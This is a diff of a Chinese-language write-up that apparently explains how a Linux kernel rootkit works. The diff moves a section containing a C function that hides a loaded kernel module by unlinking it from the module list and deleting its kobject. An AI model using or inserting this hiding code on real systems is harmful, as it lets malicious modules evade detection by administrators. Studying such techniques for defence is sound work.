@@ -188,6 +188,40 @@ struct dirent* readdir(DIR *dirp)
 ##### 修改哪些数据结构
 
 
+ 
+隐藏模块。具体功能如下：
+
+- 记录当前模块的链表前驱节点。
+- 从模块链表中删除当前模块。
+- 记录当前模块的kobject链表前驱节点。
+- 删除模块的kobject。
+- 从kobject链表中删除当前模块。
+
+ 
+```bash
+
+
+static struct list_head *module_previous;
+static struct list_head *module_kobj_previous;
+static char module_hidden = 0;
+
+
+void module_hide(void)
+{
+	if (module_hidden) return;
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	module_hidden = !module_hidden;
+}
+ 
+ 
+ ```
+
+
+
 
 ##### 怎么HOOK与HOOK哪些函数
 
@@ -224,34 +258,3 @@ getdents(3, /* 0 entries */, 32768)     = 0
  
  
  
- 
-隐藏模块。具体功能如下：
-
-- 记录当前模块的链表前驱节点。
-- 从模块链表中删除当前模块。
-- 记录当前模块的kobject链表前驱节点。
-- 删除模块的kobject。
-- 从kobject链表中删除当前模块。
-
- 
-```bash
-
-
-static struct list_head *module_previous;
-static struct list_head *module_kobj_previous;
-static char module_hidden = 0;
-
-
-void module_hide(void)
-{
-	if (module_hidden) return;
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
-	module_hidden = !module_hidden;
-}
- 
- 
- ```
